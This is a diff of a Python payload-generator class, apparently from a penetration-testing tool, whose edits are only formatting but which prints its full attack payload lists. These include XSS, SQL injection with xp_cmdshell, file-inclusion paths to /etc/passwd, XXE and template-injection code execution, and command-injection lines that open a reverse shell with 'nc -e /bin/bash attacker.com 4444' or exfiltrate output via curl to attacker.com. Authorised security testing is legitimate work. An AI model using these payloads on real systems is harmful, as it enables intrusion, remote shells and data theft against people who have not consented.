@@ -7,7 +7,7 @@ with contextual awareness and encoding variations. Supports multiple attack
 types including XSS, SQLi, LFI, Command Injection, XXE, and SSTI.
 """
 
-from typing import Dict, Any, List
+from typing import Any, Dict
 
 
 class AIPayloadGenerator:
@@ -16,14 +16,18 @@ class AIPayloadGenerator:
     def __init__(self):
         self.payload_templates = {
             "xss": {
-                "basic": ["<script>alert('XSS')</script>", "javascript:alert('XSS')", "'><script>alert('XSS')</script>"],
+                "basic": [
+                    "<script>alert('XSS')</script>",
+                    "javascript:alert('XSS')",
+                    "'><script>alert('XSS')</script>",
+                ],
                 "advanced": [
                     "<img src=x onerror=alert('XSS')>",
                     "<svg onload=alert('XSS')>",
                     "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
                     "\"><script>alert('XSS')</script><!--",
                     "<iframe src=\"javascript:alert('XSS')\">",
-                    "<body onload=alert('XSS')>"
+                    "<body onload=alert('XSS')>",
                 ],
                 "bypass": [
                     "<ScRiPt>alert('XSS')</ScRiPt>",
@@ -31,8 +35,8 @@ class AIPayloadGenerator:
                     "<img src=\"javascript:alert('XSS')\">",
                     "<svg/onload=alert('XSS')>",
                     "javascript:alert('XSS')",
-                    "<details ontoggle=alert('XSS')>"
-                ]
+                    "<details ontoggle=alert('XSS')>",
+                ],
             },
             "sqli": {
                 "basic": ["' OR '1'='1", "' OR 1=1--", "admin'--", "' UNION SELECT NULL--"],
@@ -42,14 +46,14 @@ class AIPayloadGenerator:
                     "' AND (SELECT SUBSTRING(@@version,1,10))='Microsoft'--",
                     "'; EXEC xp_cmdshell('whoami')--",
                     "' OR 1=1 LIMIT 1--",
-                    "' AND 1=(SELECT COUNT(*) FROM tablenames)--"
+                    "' AND 1=(SELECT COUNT(*) FROM tablenames)--",
                 ],
                 "time_based": [
                     "'; WAITFOR DELAY '00:00:05'--",
                     "' OR (SELECT SLEEP(5))--",
                     "'; SELECT pg_sleep(5)--",
-                    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
-                ]
+                    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+                ],
             },
             "lfi": {
                 "basic": ["../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"],
@@ -59,8 +63,8 @@ class AIPayloadGenerator:
                     "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
                     "/var/log/apache2/access.log",
                     "/proc/self/environ",
-                    "/etc/passwd%00"
-                ]
+                    "/etc/passwd%00",
+                ],
             },
             "cmd_injection": {
                 "basic": ["; whoami", "| whoami", "& whoami", "`whoami`"],
@@ -68,13 +72,13 @@ class AIPayloadGenerator:
                     "; cat /etc/passwd",
                     "| nc -e /bin/bash attacker.com 4444",
                     "&& curl http://attacker.com/$(whoami)",
-                    "`curl http://attacker.com/$(id)`"
-                ]
+                    "`curl http://attacker.com/$(id)`",
+                ],
             },
             "xxe": {
                 "basic": [
-                    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
-                    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]><foo>&xxe;</foo>"
+                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/">]><foo>&xxe;</foo>',
                 ]
             },
             "ssti": {
@@ -82,9 +86,9 @@ class AIPayloadGenerator:
                 "advanced": [
                     "{{config}}",
                     "{{''.__class__.__mro__[2].__subclasses__()}}",
-                    "{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}"
-                ]
-            }
+                    "{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}",
+                ],
+            },
         }
 
     def generate_contextual_payload(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
@@ -109,7 +113,7 @@ class AIPayloadGenerator:
             "payload_count": len(enhanced_payloads),
             "payloads": enhanced_payloads,
             "test_cases": test_cases,
-            "recommendations": self._get_recommendations(attack_type)
+            "recommendations": self._get_recommendations(attack_type),
         }
 
     def _get_payloads(self, attack_type: str, complexity: str) -> list:
@@ -129,21 +133,25 @@ class AIPayloadGenerator:
 
         for payload in payloads:
             # Basic payload
-            enhanced.append({
-                "payload": payload,
-                "context": "basic",
-                "encoding": "none",
-                "risk_level": self._assess_risk_level(payload)
-            })
+            enhanced.append(
+                {
+                    "payload": payload,
+                    "context": "basic",
+                    "encoding": "none",
+                    "risk_level": self._assess_risk_level(payload),
+                }
+            )
 
             # URL encoded version
             url_encoded = payload.replace(" ", "%20").replace("<", "%3C").replace(">", "%3E")
-            enhanced.append({
-                "payload": url_encoded,
-                "context": "url_encoded",
-                "encoding": "url",
-                "risk_level": self._assess_risk_level(payload)
-            })
+            enhanced.append(
+                {
+                    "payload": url_encoded,
+                    "context": "url_encoded",
+                    "encoding": "url",
+                    "risk_level": self._assess_risk_level(payload),
+                }
+            )
 
         return enhanced
 
@@ -157,7 +165,7 @@ class AIPayloadGenerator:
                 "payload": payload_info["payload"],
                 "method": "GET" if len(payload_info["payload"]) < 100 else "POST",
                 "expected_behavior": self._get_expected_behavior(attack_type),
-                "risk_level": payload_info["risk_level"]
+                "risk_level": payload_info["risk_level"],
             }
             test_cases.append(test_case)
 
@@ -171,7 +179,7 @@ class AIPayloadGenerator:
             "lfi": "File content disclosure",
             "cmd_injection": "Command execution on server",
             "ssti": "Template expression evaluation",
-            "xxe": "XML external entity processing"
+            "xxe": "XML external entity processing",
         }
         return behaviors.get(attack_type, "Unexpected application behavior")
 
@@ -195,23 +203,23 @@ class AIPayloadGenerator:
             "xss": [
                 "Test in different input fields and parameters",
                 "Try both reflected and stored XSS scenarios",
-                "Test with different browsers for compatibility"
+                "Test with different browsers for compatibility",
             ],
             "sqli": [
                 "Test different SQL injection techniques",
                 "Try both error-based and blind injection",
-                "Test various database-specific payloads"
+                "Test various database-specific payloads",
             ],
             "lfi": [
                 "Test various directory traversal depths",
                 "Try different encoding techniques",
-                "Test for log file inclusion"
+                "Test for log file inclusion",
             ],
             "cmd_injection": [
                 "Test different command separators",
                 "Try both direct and blind injection",
-                "Test with various payloads for different OS"
-            ]
+                "Test with various payloads for different OS",
+            ],
         }
 
         return recommendations.get(attack_type, ["Test thoroughly", "Monitor responses"])
